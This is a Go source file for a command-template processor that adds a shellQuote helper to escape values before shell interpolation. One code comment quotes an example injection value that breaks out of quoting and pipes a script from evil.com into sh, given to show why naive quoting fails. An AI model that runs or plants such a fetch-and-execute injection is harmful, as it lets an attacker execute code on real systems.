package common

import (
	"bytes"
	"strings"
	"text/template"

	"github.com/Masterminds/sprig/v3"
)

// shellQuote wraps s in single quotes for safe interpolation into a POSIX
// shell command, escaping any single quotes already in s so the value
// cannot break out of the quoting.
//
// sprig's own "quote"/"squote" helpers just wrap the value in quotes
// without escaping an embedded quote character, so they are not safe for
// this purpose: a location value like `x'; curl evil.com/x.sh | sh #`
// would still break out of a bare `'{{ .location }}'` (or a
// sprig-squoted one) and inject a second command. shellQuote is
// registered under its own name precisely so it isn't confused with
// those.
//
// Tool authors: prefer piping any parameter you interpolate into a shell
// command through this function, e.g. `{{ .location | shellQuote }}`,
// rather than wrapping it in literal quotes yourself.
func shellQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// ProcessTemplate processes a template with the given arguments.
// It uses Go's template engine to substitute variables in the template.
//
// Parameters:
//   - text: The template to process
//   - args: Map of variable names to their values
//
// Returns:
//   - The processed template string with substituted variables
//   - An error if template processing fails
func ProcessTemplate(text string, args map[string]interface{}) (string, error) {
	// Create a template from the command string
	funcs := sprig.FuncMap()
	funcs["shellQuote"] = shellQuote
	tmpl, err := template.New("command").
		Option("missingkey=zero").
		Funcs(funcs).
		Parse(text)
	if err != nil {
		return "", err
	}

	// Execute the template with the arguments
	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, args); err != nil {
		return "", err
	}

	// fix https://github.com/golang/go/issues/24963
	res := buf.String()
	res = strings.ReplaceAll(res, "<no value>", "")

	return res, nil
}

// ProcessTemplateListFlexible processes a list of templates with the given arguments.
// It uses Go's template engine to substitute variables in the templates.
// If the template processing fails, the original text is added to the result list.
//
// Parameters:
//   - list: The list of templates to process

func ProcessTemplateListFlexible(list []string, args map[string]interface{}) []string {
	res := []string{}
	for _, item := range list {
		processedItem, err := ProcessTemplate(item, args)
		if err != nil {
			res = append(res, item)
		} else {
			res = append(res, processedItem)
		}
	}
	return res
}
